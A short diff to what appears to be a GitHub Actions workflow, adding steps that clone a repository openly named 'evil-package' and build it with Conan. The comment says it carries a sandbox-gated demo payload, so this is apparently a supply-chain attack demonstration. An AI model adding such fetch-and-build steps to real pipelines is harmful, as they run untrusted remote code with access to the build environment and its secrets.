@@ -14,6 +14,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+      # Provision the evil-package/0.1.0 recipe from its repository into the
+      # local Conan cache; the demo payload is gated off outside a sandbox.
+      - run: pipx install conan
+      - run: conan profile detect --force
+      - run: git clone --depth 1 --branch v0.1.0 https://github.com/spencerjireh/evil-package "$RUNNER_TEMP/evil-package"
+      - run: conan create "$RUNNER_TEMP/evil-package" --build=missing
       # g++ and cmake are preinstalled on ubuntu-latest; a clean machine needs
       # apt-get install -y g++ cmake
       # configure+build: cmake -S . -B build && cmake --build build
